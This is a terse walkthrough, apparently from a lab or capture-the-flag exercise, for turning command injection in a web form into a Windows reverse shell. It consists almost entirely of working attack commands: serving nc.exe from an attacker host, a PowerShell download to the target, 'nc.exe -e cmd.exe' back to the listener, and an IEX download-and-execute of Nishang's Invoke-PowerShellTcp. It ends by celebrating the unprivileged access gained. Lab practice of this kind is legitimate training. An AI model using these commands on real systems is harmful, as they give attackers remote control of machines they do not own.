1. Get a copy of NetCat for windows and host it on a webserver - 
    'https://joncraton.org/blog/46/netcat-for-windows/'
    (10.10.10.2:8000/nc.exe will be used as an example)
        python -m SimpleHTTPServer in directory holding nc.exe

2 Set up nc listener on attack machine
    nc -lnvp 4444

3. From the SysCallSubmit webpage we will need to submit a series of commands
   that:
   (SysCall submit will send commands to CMD. use 
   'powershell -command "POWERSHELLCOMMANDHERE"' to execute powershell commands)
   a) Download nc from webserver (nc.zip is the downloaded file)
        powershell -command "Invoke-WebRequest -UseBasicParsing 
        -OutFile .\nc.exe http://10.10.10.2:8000/nc.exe"
   d) Send reverse shell to attacker(this command launches a shell 
        specifically on 3001)
        .\nc.exe 10.10.10.2 4444 -e cmd.exe"

3(alt). You can also do this without netcat. down load this:
        https://github.com/samratashok/nishang/blob/master/Shells/Invoke-
        PowerShellTcp.ps1
    paste this line at the bottom of the file with your attack ip:
        Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 
        -Port 4444

    Download and execute the file with one command:
        powershell "IEX(New-Object Net.WebClient).downlaodString('http://10.
        10.10.2:8000/Invoke-PowerShellTcp.ps1')"

YOU NOW HAVE UNPRIVILEGED ACCESS :)
